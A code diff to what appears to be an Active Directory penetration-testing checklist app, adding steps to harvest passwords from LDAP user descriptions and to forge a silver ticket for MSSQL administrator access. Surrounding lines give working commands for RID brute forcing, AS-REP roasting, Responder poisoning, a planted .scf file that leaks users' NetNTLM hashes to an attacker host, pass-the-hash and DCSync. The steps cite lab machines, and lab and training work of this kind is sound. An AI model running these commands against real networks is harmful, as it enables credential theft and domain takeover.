@@ -784,6 +784,7 @@ const TRACKS=[
    {d:"Enumerate valid users",c:"kerbrute userenum -d {DOMAIN} --dc {IP} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
     l:"Also pull users from anonymous LDAP or SMB where allowed."},
    {d:"Null or guest session? brute the RIDs for a user list",c:"nxc smb {IP} -u '' -p '' --rid-brute 10000    # or: impacket-lookupsid {DOMAIN}/guest@{IP} 10000",l:"Walks SIDs from 500 upward and resolves each to a name, so it returns the <b>real</b> domain users and groups rather than guesses from a wordlist. Feed the result straight into AS-REP roasting and spraying. Works on many DCs that otherwise look locked down. The <i>Flight</i> and <i>Forest</i> user lists."},
+   {d:"Read the user objects, not just their names — description holds passwords",c:"nxc ldap {IP} -u {USER} -p {PASS} -M user-desc\nldapsearch -x -H ldap://{IP} -b \"DC=example,DC=com\" \"(objectClass=user)\" sAMAccountName description info | grep -iE 'sAMAccountName|description|info'",l:"<code>description</code> and <code>info</code> are free-text and visible to <b>any</b> authenticated user — often to an anonymous bind too. Helpdesk staff park a reset password there and never clear it, so this pays out before any roasting or spraying. Works with the null/guest session above where the DC allows it. Both <i>Hokkaido</i> and <i>Nagoya</i> hand out a first credential this way."},
    {d:"AS-REP roast users without pre-auth",c:"impacket-GetNPUsers {DOMAIN}/ -no-pass -usersfile users.txt -dc-ip {IP}",l:"Crack any $krb5asrep$ hash offline with hashcat -m 18200."},
    {d:"Poison and relay on the local segment",c:"sudo responder -I tun0    # then relay/crack captured NetNTLM",l:"mitm6 for IPv6 DNS takeover. Great when you are on the internal network."},
    {d:"Writable share? plant a forced-auth file and catch a browsing user’s hash",c:"cat > @pwn.scf <<'EOF'\n[Shell]\nCommand=2\nIconFile=\\\\{LHOST}\\share\\x.ico\n[Taskbar]\nCommand=ToggleDesktop\nEOF\nsmbclient //{IP}/<share> -N -c 'put @pwn.scf'   # Responder already listening",l:"Explorer fetches that icon over SMB the moment anyone opens the folder, leaking their NetNTLMv2 to your Responder — no click needed, and the leading <code>@</code> sorts the file to the top. Crack it (hashcat -m 5600) or relay it. A <code>.url</code> file (<code>[InternetShortcut]</code> / <code>URL=file://{LHOST}/x.ico</code>) or a <code>.lnk</code> with a UNC icon does the same and still fires where .scf has been patched out. The <i>Sizzle</i> foothold."},
@@ -803,7 +804,8 @@ const TRACKS=[
  ]},
  {n:4,title:"Lateral movement",tag:"attack",goal:"Execute on other hosts with what you have",steps:[
    {d:"Pass the hash or password to a shell",c:"impacket-wmiexec {DOMAIN}/{USER}:{PASS}@{IP}    # or -hashes LM:NT",l:"psexec, smbexec, wmiexec, atexec, or evil-winrm all take -H for a hash."},
-   {d:"Overpass-the-hash / use a Kerberos ticket",c:"# getTGT with the hash, export KRB5CCNAME, then -k -no-pass",l:"Needed when only Kerberos auth is allowed, and for ticket attacks."}
+   {d:"Overpass-the-hash / use a Kerberos ticket",c:"# getTGT with the hash, export KRB5CCNAME, then -k -no-pass",l:"Needed when only Kerberos auth is allowed, and for ticket attacks."},
+   {d:"Silver ticket: a service account hash is admin on that one service",c:"impacket-lookupsid {DOMAIN}/{USER}:{PASS}@{IP} 0 | grep 'Domain SID'\nimpacket-ticketer -nthash <svc-nt-hash> -domain-sid S-1-5-21-... -domain {DOMAIN} \\\n  -spn MSSQLSvc/sql.{DOMAIN}:1433 -user-id 500 Administrator\nexport KRB5CCNAME=Administrator.ccache\nimpacket-mssqlclient {DOMAIN}/Administrator@sql.{DOMAIN} -k -no-pass",l:"Kerberoasting hands you a service account password; this turns it straight into <b>Administrator on that service</b> without touching krbtgt, DCSync or a domain admin. You forge the TGS yourself, so the DC never sees the request and never checks whether the user exists — <code>-user-id 500</code> simply asserts you are the built-in Administrator. Scope is the one SPN you sign for. Get the domain SID from <code>lookupsid</code> or <code>Get-DomainSID</code>, and use the <i>service</i> account's hash, not the machine's. The <i>Nagoya</i> route to MSSQL when <code>xp_cmdshell</code> is denied to your own account."}
  ]},
  {n:5,title:"Domain dominance",tag:"post-exploit",goal:"Own the domain and prove it",steps:[
    {d:"DCSync to pull the krbtgt and admin hashes",c:"impacket-secretsdump {DOMAIN}/{USER}:{PASS}@{IP}",l:"Needs replication rights (Domain Admin, or an ACL that grants it). Dumps the whole domain."},
@@ -1056,7 +1058,7 @@ const TRACKS=[
 ]}
 ];
 
-const APP_VERSION="1.4.2";
+const APP_VERSION="1.5.0";
 
 // ---------- storage ----------
 // Everything lives in localStorage, so a private window or a full quota loses
